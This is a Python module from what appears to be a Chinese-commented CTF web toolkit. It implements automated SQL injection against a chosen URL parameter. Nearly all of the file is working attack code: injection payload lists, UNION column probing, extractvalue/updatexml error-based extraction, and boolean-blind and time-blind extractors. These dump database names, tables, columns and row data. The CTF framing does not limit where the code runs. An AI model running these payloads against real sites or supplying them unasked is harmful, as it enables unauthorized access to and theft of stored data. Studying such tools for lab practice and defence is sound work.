"""
CTF Web Toolkit - SQL Injection Module
支持：错误回显注入 / 布尔盲注 / 时间盲注 / UNION 注入
"""

import time
from typing import Optional
from core.requester import Requester
from core.utils import ok, info, warn, err, found, section

# ── 常用错误特征 ──────────────────────────────
SQL_ERROR_PATTERNS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sqlstate",
    "ora-",
    "pg_query",
    "sqlite_",
    "microsoft ole db provider for sql server",
    "odbc sql server driver",
    "syntax error",
    "mysql_fetch",
    "supplied argument is not a valid mysql",
]

# ── 检测 Payload ──────────────────────────────
DETECT_PAYLOADS = [
    "'",
    "\"",
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "\" OR \"1\"=\"1",
    "1' AND '1'='2",
    "1 AND 1=2",
    "' AND SLEEP(0)--",
]

# ── UNION 探测 ────────────────────────────────
def union_detect(requester: Requester, url: str, param: str,
                 max_cols: int = 20, method: str = "GET") -> Optional[int]:
    """探测 UNION 注入的列数"""
    section("UNION 列数探测")
    for n in range(1, max_cols + 1):
        nulls = ",".join(["NULL"] * n)
        payload = f"' UNION SELECT {nulls}--"
        resp = _inject(requester, url, param, payload, method)
        if resp and resp.status_code == 200:
            if "error" not in resp.text.lower():
                ok(f"UNION 列数: {n}")
                return n
    warn("未找到 UNION 列数")
    return None


def union_dump(requester: Requester, url: str, param: str,
               cols: int, target_col: int, expr: str, method: str = "GET") -> Optional[str]:
    """利用 UNION 注入提取数据，expr 为要查询的表达式，如 database()"""
    nulls = ["NULL"] * cols
    nulls[target_col - 1] = expr
    payload = f"' UNION SELECT {','.join(nulls)}--"
    resp = _inject(requester, url, param, payload, method)
    if resp:
        return resp.text
    return None


# ── 错误回显注入 ──────────────────────────────
def error_based_detect(requester: Requester, url: str, param: str,
                        method: str = "GET") -> bool:
    """检测是否存在错误回显型 SQL 注入"""
    section("错误回显注入检测")
    for payload in DETECT_PAYLOADS:
        resp = _inject(requester, url, param, payload, method)
        if resp:
            body = resp.text.lower()
            for pattern in SQL_ERROR_PATTERNS:
                if pattern in body:
                    found("错误注入", f"payload={payload!r} | 特征={pattern!r}")
                    return True
    info("未发现错误回显特征")
    return False


def error_based_dump(requester: Requester, url: str, param: str,
                     expr: str = "database()", method: str = "GET") -> Optional[str]:
    """MySQL 错误回显提取数据（extractvalue / updatexml）"""
    payloads = [
        f"' AND extractvalue(1,concat(0x7e,({expr}),0x7e))--",
        f"' AND updatexml(1,concat(0x7e,({expr}),0x7e),1)--",
        f"' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(({expr}),0x3a,FLOOR(RAND(0)*2))x "
        f"FROM information_schema.tables GROUP BY x)a)--",
    ]
    for payload in payloads:
        resp = _inject(requester, url, param, payload, method)
        if resp:
            import re
            match = re.search(r"~(.+?)~", resp.text)
            if match:
                found(expr, match.group(1))
                return match.group(1)
    return None


# ── 布尔盲注 ─────────────────────────────────
class BooleanBlind:
    """布尔盲注提取器"""

    def __init__(self, requester: Requester, url: str, param: str,
                 true_condition: str = "1=1", false_condition: str = "1=2",
                 method: str = "GET", true_string: str = ""):
        self.req = requester
        self.url = url
        self.param = param
        self.method = method
        self.true_cond = true_condition
        self.false_cond = false_condition
        self.true_string = true_string
        self._baseline_true = ""
        self._baseline_false = ""

    def calibrate(self):
        """校准真假响应基线"""
        section("布尔盲注校准")
        r_true = _inject(self.req, self.url, self.param,
                         f"' AND {self.true_cond}--", self.method)
        r_false = _inject(self.req, self.url, self.param,
                          f"' AND {self.false_cond}--", self.method)
        if r_true and r_false:
            self._baseline_true = r_true.text
            self._baseline_false = r_false.text
            diff = abs(len(self._baseline_true) - len(self._baseline_false))
            ok(f"真响应长度: {len(self._baseline_true)}  假响应长度: {len(self._baseline_false)}  差值: {diff}")
            return diff > 0
        return False

    def _is_true(self, payload: str) -> bool:
        resp = _inject(self.req, self.url, self.param, payload, self.method)
        if not resp:
            return False
        if self.true_string:
            return self.true_string in resp.text
        # 按响应长度相似度判断
        return abs(len(resp.text) - len(self._baseline_true)) < \
               abs(len(resp.text) - len(self._baseline_false))

    def extract_length(self, expr: str) -> int:
        """提取字符串长度"""
        for length in range(1, 200):
            payload = f"' AND LENGTH(({expr}))={length}--"
            if self._is_true(payload):
                ok(f"LENGTH({expr}) = {length}")
                return length
        return 0

    def extract_string(self, expr: str, length: Optional[int] = None) -> str:
        """逐字符提取字符串（二分法）"""
        if length is None:
            length = self.extract_length(expr)
        result = ""
        for pos in range(1, length + 1):
            lo, hi = 32, 127
            while lo < hi:
                mid = (lo + hi) // 2
                payload = f"' AND ASCII(SUBSTRING(({expr}),{pos},1))>{mid}--"
                if self._is_true(payload):
                    lo = mid + 1
                else:
                    hi = mid
            result += chr(lo)
            print(f"\r  [*] 提取中: {result}", end="", flush=True)
        print()
        found(expr, result)
        return result

    def dump_database(self) -> str:
        return self.extract_string("database()")

    def dump_tables(self, db: str) -> str:
        expr = f"SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='{db}'"
        return self.extract_string(expr)

    def dump_columns(self, db: str, table: str) -> str:
        expr = (f"SELECT GROUP_CONCAT(column_name) FROM information_schema.columns "
                f"WHERE table_schema='{db}' AND table_name='{table}'")
        return self.extract_string(expr)

    def dump_data(self, db: str, table: str, column: str, limit: int = 5) -> str:
        expr = f"SELECT GROUP_CONCAT({column} SEPARATOR ',') FROM {db}.{table} LIMIT {limit}"
        return self.extract_string(expr)


# ── 时间盲注 ─────────────────────────────────
class TimeBlind:
    """时间盲注提取器（MySQL SLEEP / PostgreSQL pg_sleep）"""

    def __init__(self, requester: Requester, url: str, param: str,
                 sleep_sec: float = 3.0, method: str = "GET", db_type: str = "mysql"):
        self.req = requester
        self.url = url
        self.param = param
        self.method = method
        self.sleep = sleep_sec
        self.db_type = db_type

    def _sleep_expr(self) -> str:
        if self.db_type == "mysql":
            return f"SLEEP({self.sleep})"
        elif self.db_type == "postgres":
            return f"pg_sleep({self.sleep})"
        elif self.db_type == "mssql":
            return f"WAITFOR DELAY '0:0:{int(self.sleep)}'"
        return f"SLEEP({self.sleep})"

    def detect(self) -> bool:
        """检测时间盲注"""
        section("时间盲注检测")
        expr = self._sleep_expr()
        payload = f"' AND {expr}--"
        t0 = time.time()
        _inject(self.req, self.url, self.param, payload, self.method)
        elapsed = time.time() - t0
        if elapsed >= self.sleep * 0.8:
            found("时间盲注", f"延迟 {elapsed:.2f}s (期望 {self.sleep}s)")
            return True
        info(f"无延迟响应: {elapsed:.2f}s")
        return False

    def _is_true(self, condition: str) -> bool:
        expr = self._sleep_expr()
        payload = f"' AND IF({condition},{expr},0)--"
        t0 = time.time()
        _inject(self.req, self.url, self.param, payload, self.method)
        return (time.time() - t0) >= self.sleep * 0.8

    def extract_string(self, expr: str, max_len: int = 64) -> str:
        result = ""
        # 先确定长度
        length = 0
        for l in range(1, max_len + 1):
            if self._is_true(f"LENGTH(({expr}))={l}"):
                length = l
                ok(f"长度: {l}")
                break
        # 逐字符二分提取
        for pos in range(1, length + 1):
            lo, hi = 32, 127
            while lo < hi:
                mid = (lo + hi) // 2
                if self._is_true(f"ASCII(SUBSTRING(({expr}),{pos},1))>{mid}"):
                    lo = mid + 1
                else:
                    hi = mid
            result += chr(lo)
            print(f"\r  [*] 提取中: {result}", end="", flush=True)
        print()
        found(expr, result)
        return result


# ── 内部辅助 ─────────────────────────────────
def _inject(requester: Requester, url: str, param: str, payload: str, method: str):
    try:
        if method.upper() == "GET":
            return requester.get(url, params={param: payload})
        else:
            return requester.post(url, data={param: payload})
    except Exception as e:
        err(f"请求失败: {e}")
        return None


# ── 快速扫描入口 ──────────────────────────────
def quick_scan(requester: Requester, url: str, params: list,
               method: str = "GET") -> dict:
    """快速扫描所有参数，返回可注入参数列表"""
    section("SQL 注入快速扫描")
    result = {"error_based": [], "potential": []}
    for param in params:
        info(f"测试参数: {param}")
        if error_based_detect(requester, url, param, method):
            result["error_based"].append(param)
        else:
            # 简单差异检测
            r1 = _inject(requester, url, param, "1 AND 1=1", method)
            r2 = _inject(requester, url, param, "1 AND 1=2", method)
            if r1 and r2 and len(r1.text) != len(r2.text):
                warn(f"参数 {param!r} 存在响应差异，可能存在布尔盲注")
                result["potential"].append(param)
    return result
